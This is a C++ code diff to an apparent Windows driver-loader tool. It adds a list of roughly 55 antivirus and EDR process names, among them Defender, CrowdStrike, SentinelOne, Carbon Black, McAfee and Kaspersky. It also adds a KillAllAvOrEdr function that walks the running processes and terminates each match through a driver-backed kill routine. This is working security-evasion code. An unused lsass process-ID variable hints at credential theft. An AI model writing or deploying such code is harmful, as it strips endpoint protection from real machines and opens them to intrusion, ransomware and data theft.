@@ -8,9 +8,75 @@
 #include <filesystem>
 #include <fstream>
 #include <DbgHelp.h>
+#include <tlhelp32.h>
+#include <tchar.h>
+#include <unordered_set>
+#include <algorithm>
 
 #pragma comment(lib, "Psapi.lib")
 #pragma comment(lib, "Dbghelp.lib")
+
+const
+wchar_t*
+AvOrEdrNames[] = {
+	L"MsMpEng.exe",
+	L"SecurityHealthService.exe",
+	L"SecurityHealthSystray.exe",
+	L"MsSense.exe",
+	L"SenseNdr.exe",
+	L"SenseTVM.exe",
+	L"NisSrv.exe",
+	L"MpCmdRun.exe",
+	L"MpSigStub.exe",
+	L"ConfigSecurityPolicy.exe",
+	L"smartscreen.exe",
+	L"CSFalconService.exe",
+	L"CSFalconContainer.exe",
+	L"CSAgent.exe",
+	L"falcon-sensor.exe",
+	L"SentinelAgent.exe",
+	L"SentinelAgentWorker.exe",
+	L"SentinelServiceHost.exe",
+	L"SentinelStaticEngine.exe",
+	L"cb.exe",
+	L"cbstream.exe",
+	L"carbonblack.exe",
+	L"RepMgr.exe",
+	L"RepUtils.exe",
+	L"RepUx.exe",
+	L"ccSvcHst.exe",
+	L"SymCorpUI.exe",
+	L"SEPM.exe",
+	L"SmcGui.exe",
+	L"smc.exe",
+	L"ccApp.exe",
+	L"McShield.exe", 
+	L"mfevtps.exe", 
+	L"mfeann.exe", 
+	L"mcapexe.exe", 
+	L"ModuleCoreService.exe",
+	L"mfemms.exe",
+	L"PccNTMon.exe", 
+	L"ntrtscan.exe", 
+	L"tmlisten.exe",
+	L"CNTAoSMgr.exe",
+	L"TmCCSF.exe", 
+	L"avp.exe",
+	L"kavtray.exe", 
+	L"klnagent.exe", 
+	L"ksde.exe", 
+	L"cytray.exe", 
+	L"cyserver.exe",
+	L"CyveraService.exe",
+	L"xagt.exe", 
+	L"fe_avk.exe", 
+	L"HX.exe",
+	L"HipsDaemon.exe",
+	L"HipsTray.exe",
+	L"ZhuDongFangYu.exe"
+};
+
+
 
 
 typedef USHORT RTL_ATOM, * PRTL_ATOM;
@@ -271,6 +337,45 @@ DriverLoader::SetSignatureLevel(
 	} while (FALSE);
 
 	return TRUE;
+}
+
+VOID 
+DriverLoader::KillAllAvOrEdr()
+{
+	std::unordered_set<std::wstring> edrSet{};
+	for (size_t i = 0; i < _countof(AvOrEdrNames); ++i)
+	{
+		if (AvOrEdrNames[i] && *AvOrEdrNames[i] != L'\0')
+		{
+			edrSet.emplace(AvOrEdrNames[i]);
+		}
+	}
+
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE)
+	{
+		LOG("CreateToolhelp32Snapshot failed: " << GetLastError());
+		return;
+	}
+
+	PROCESSENTRY32 pe32;
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	DWORD lsassPid = 0;
+
+	if (Process32First(hSnapshot, &pe32))
+	{
+		do
+		{
+			if (edrSet.count(pe32.szExeFile) > 0)
+			{
+				DriverWorker::Kill(pe32.th32ProcessID);
+			}
+
+		} while (Process32Next(hSnapshot, &pe32));
+	}
+
+	CloseHandle(hSnapshot);
 }
 
 auto DriverLoader::InitMemoryManager() ->BOOLEAN
